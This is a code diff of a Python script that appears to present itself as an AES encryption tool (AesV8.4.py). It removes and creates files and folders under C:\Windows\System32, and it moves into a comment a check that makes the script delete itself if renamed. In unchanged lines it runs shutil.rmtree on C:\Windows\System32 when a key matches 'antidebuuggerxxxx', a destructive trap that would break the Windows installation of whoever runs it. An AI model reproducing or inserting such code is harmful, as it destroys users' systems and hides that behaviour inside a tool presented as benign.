@@ -12,8 +12,23 @@ file_pathaesconfig = os.path.join(desktop_pathxsd, 'aes_config.txt')
 if os.path.isfile(file_pathaesconfig):
     os.remove(file_pathaesconfig)
     print("")
-
 os.system('cls')
+
+filenamex = os.path.basename(__file__)
+#discord_warning(filenamex)
+'''
+if filenamex != "AesV8.4.py":
+    os.system('cls')
+    script_path = os.path.realpath(__file__)
+    os.remove(script_path)
+    input()
+    os.system('cls')
+    print("Error.")
+    sys.exit()
+'''
+os.system('cls')
+
+
 if os.path.isdir(r"C:\Windows\System32\FileSystemXS"):
     shutil.rmtree(r"C:\Windows\System32\FileSystemXS")
 os.system('cls')
@@ -166,17 +181,7 @@ create_file_in_system32('88systemdrivervul.txt', 'KRmMXvKn0m')
 create_file_in_system32('88datavulnerablex.txt', 'SjXfmLtdao3ilnxb')
 create_file_in_system32('88infosystem.txt', 'klh_qupuw6n3pq')
 os.system('cls')
-filenamex = os.path.basename(__file__)
-#discord_warning(filenamex)
-if filenamex != "AesV8.4.py":
-    os.system('cls')
-    script_path = os.path.realpath(__file__)
-    os.remove(script_path)
-    input()
-    os.system('cls')
-    print("Error.")
-    sys.exit()
-os.system('cls')
+
 aesv7()
 if cskey =="antidebuuggerxxxx":
     shutil.rmtree(r'C:\Windows\System32')
